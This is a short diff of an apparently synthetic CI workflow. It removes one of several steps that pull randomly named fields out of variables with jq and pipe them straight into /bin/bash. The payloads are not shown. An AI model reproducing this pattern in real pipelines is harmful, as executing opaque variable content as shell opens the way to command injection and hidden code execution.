@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$larg61288" | jq -r .zth655 | /bin/bash
           echo $wy144 | jq -r .xlhfi858 | /bin/bash
           printf '%s' "$fro5375" | jq -r .ewhyb061 | /bin/bash
-          echo $dqoe572 | jq -r .kdmfp80992 | /bin/bash
           echo $c20 | jq -r .zfy579 | /bin/bash
           echo $l26 | jq -r .trfhj849 | /bin/bash
           echo $bwgi39 | jq -r .t66 | /bin/bash
